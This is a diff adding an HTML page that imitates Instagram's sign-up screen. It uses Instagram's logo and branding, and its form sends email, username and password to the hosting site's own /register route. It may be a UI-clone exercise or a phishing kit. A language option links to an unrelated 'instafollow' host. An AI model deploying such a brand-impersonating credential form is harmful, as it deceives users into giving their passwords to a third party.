@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/styles/register.css" />
+
+    <link
+      rel="shortcut icon"
+      href="https://www.freepnglogos.com/uploads/logo-ig-png/logo-ig-instagram-new-logo-vector-download-13.png"
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.0/css/all.min.css"
+      integrity="sha512-10/jx2EXwxxWqCLX/hHth/vu2KY3jCF70dCQB8TSgNjbCVAC/8vai53GfMDrO2Emgwccf2pJqxct9ehpzG+MTw=="
+      crossorigin="anonymous"
+      referrerpolicy="no-referrer"
+    />
+    <title>Instagram</title>
+  </head>
+  <body>
+    <span id="root">
+      <section class="section-all">
+        <!-- 1-Role Main -->
+        <main class="main" role="main">
+          <div class="wrapper">
+            <div class="image">
+              <img src="/images/image1.png" alt="" id="image" />
+            </div>
+            <article class="article">
+              <div class="content">
+                <div class="login-box">
+                  <div class="header">
+                    <img
+                      class="logo"
+                      src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png"
+                      alt="Instagram"
+                    />
+                    <p class="info">
+                      Sign up to see photos and videos from your friends.
+                    </p>
+                    <span class="button-container">
+                      <a href="/facebook">
+                        <i class="fa-brands fa-facebook-square"></i>
+                        Log in with Facebook
+                      </a>
+                    </span>
+                    <p class="or">OR</p>
+                  </div>
+                  <!-- Header end -->
+                  <div class="form-wrap">
+                    <form class="form" action="/register" method="POST">
+                      <div class="input-box">
+                        <input
+                          type="email"
+                          id="name"
+                          aria-describedby=""
+                          placeholder="Mobile Number or Email"
+                          aria-required="true"
+                          maxlength="30"
+                          autocapitalize="off"
+                          autocorrect="off"
+                          name="email"
+                          value=""
+                          required
+                        />
+                      </div>
+                      <div class="input-box">
+                        <input
+                          type="text"
+                          id="name"
+                          aria-describedby=""
+                          placeholder="Full Name"
+                          aria-required="true"
+                          maxlength="30"
+                          autocapitalize="off"
+                          autocorrect="off"
+                          value=""
+                          required
+                        />
+                      </div>
+                      <div class="input-box">
+                        <input
+                          type="text"
+                          id="name"
+                          aria-describedby=""
+                          placeholder="Username"
+                          aria-required="true"
+                          maxlength="30"
+                          autocapitalize="off"
+                          autocorrect="off"
+                          name="name"
+                          value=""
+                          required
+                        />
+                      </div>
+
+                      <div class="input-box">
+                        <input
+                          type="password"
+                          name="password"
+                          id="password"
+                          placeholder="Password"
+                          aria-describedby=""
+                          maxlength="30"
+                          aria-required="true"
+                          autocapitalize="off"
+                          autocorrect="off"
+                          required
+                        />
+                      </div>
+
+                      <span class="button-box">
+                        <button class="btn" type="submit" name="submit">
+                          Sign up
+                        </button>
+                      </span>
+                      <p class="terms">
+                        By signing up, you agree to our
+                        <span> Terms , Data Policy</span> and
+                        <span>Cookies Policy</span> .
+                      </p>
+                    </form>
+                  </div>
+                  <!-- Form-wrap end -->
+                </div>
+                <!-- Login-box end -->
+
+                <div class="login-box">
+                  <p class="text">
+                    Have an account?<a href="/login">Log in</a>
+                  </p>
+                </div>
+                <!-- Signup-box end -->
+
+                <div class="app">
+                  <p>Get the app.</p>
+                  <div class="app-img">
+                    <a
+                      href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8"
+                    >
+                      <img
+                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png"
+                      />
+                    </a>
+                    <a
+                      href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge"
+                    >
+                      <img
+                        src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png"
+                      />
+                    </a>
+                  </div>
+                  <!-- App-img end-->
+                </div>
+                <!-- App end -->
+              </div>
+              <!-- Content end -->
+            </article>
+          </div>
+          <!-- Wrapper end -->
+        </main>
+
+        <!-- 2-Role Footer -->
+        <footer class="footer" role="contentinfo">
+          <div class="footer-container">
+            <nav class="footer-nav" role="navigation">
+              <ul>
+                <li><a href="">About Us</a></li>
+                <li><a href="">Support</a></li>
+                <li><a href="">Blog</a></li>
+                <li><a href="">Press</a></li>
+                <li><a href="">Api</a></li>
+                <li><a href="">Jobs</a></li>
+                <li><a href="">Privacy</a></li>
+                <li><a href="">Terms</a></li>
+                <li><a href="">Directory</a></li>
+                <li>
+                  <span class="language"
+                    >Language
+                    <select
+                      name="language"
+                      class="select"
+                      onchange="la(this.value)"
+                    >
+                      <option value="#">English</option>
+                      <option value="http://ru-instafollow.bitballoon.com">
+                        Russian
+                      </option>
+                    </select>
+                  </span>
+                </li>
+              </ul>
+            </nav>
+
+            <span class="footer-logo">&copy; 2018 Instagram</span>
+          </div>
+          <!-- Footer container end -->
+        </footer>
+      </section>
+    </span>
+    <!-- Root -->
+
+    <!-- Select Link -->
+    <script type="text/javascript">
+      function la(src) {
+        window.location = src;
+      }
+
+      let image = document.getElementById("image");
+      let images = [
+        "/images/image1.png",
+        "/images/image2.png",
+        "/images/image3.png",
+        "/images/image4.png",
+      ];
+      setInterval(function () {
+        let random = Math.floor(Math.random() * 4);
+        image.src = images[random];
+      }, 2500);
+    </script>
+  </body>
+</html>
